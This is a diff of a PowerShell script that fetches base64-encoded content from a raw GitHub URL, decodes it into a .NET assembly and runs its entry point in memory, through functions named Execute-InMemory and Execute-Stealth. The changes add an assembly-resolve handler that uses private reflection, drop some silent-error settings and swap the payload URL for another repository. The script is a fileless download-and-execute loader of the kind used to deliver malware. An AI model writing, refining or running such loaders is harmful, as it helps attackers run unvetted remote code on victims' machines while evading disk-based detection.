@@ -1,7 +1,3 @@
-$ErrorActionPreference = "SilentlyContinue"
-[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
-$ProgressPreference = 'SilentlyContinue'
-
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 function Download-Base64 {
@@ -25,11 +21,47 @@ function Execute-InMemory {
         [byte[]]$bytes
     )
 
-    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)
+    $script:mainAssembly = $null
+    
+    $onAssemblyResolve = {
+        param($sender, $e)
+        if ($e.Name -like "*mscorlib*") {
+            return $null
+        }
+        
+        if ($script:mainAssembly -ne $null) {
+            try {
+                $requestedAssembly = $script:mainAssembly.GetType($e.Name.Split(',')[0])
+                if ($requestedAssembly -ne $null) {
+                    return $script:mainAssembly
+                }
+            } catch {}
+        }
+        
+        foreach ($assembly in [System.AppDomain]::CurrentDomain.GetAssemblies()) {
+            if ($assembly.FullName -eq $e.Name) {
+                return $assembly
+            }
+        }
+        
+        return $null
+    }
 
-    $entryPoint = $assembly.EntryPoint
+    $resolverField = [System.AppDomain].GetField('_AssemblyResolve', [System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Instance)
+    if ($resolverField -ne $null) {
+        $currentResolver = $resolverField.GetValue([System.AppDomain]::CurrentDomain)
+        if ($currentResolver -eq $null) {
+            [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
+        }
+    } else {
+        [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
+    }
+
+    $script:mainAssembly = [System.Reflection.Assembly]::Load($bytes)
+    
+    $entryPoint = $script:mainAssembly.EntryPoint
     if ($entryPoint -ne $null) {
-        $entryPoint.Invoke($null, @()) | Out-Null
+        $entryPoint.Invoke($null, @())
     }
 }
 
@@ -47,6 +79,6 @@ function Execute-Stealth {
     }
 }
 
-$url = "https://raw.githubusercontent.com/thegoatofapi/myl/refs/heads/main/file.txt"
+$url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"
 
 Execute-Stealth -url $url
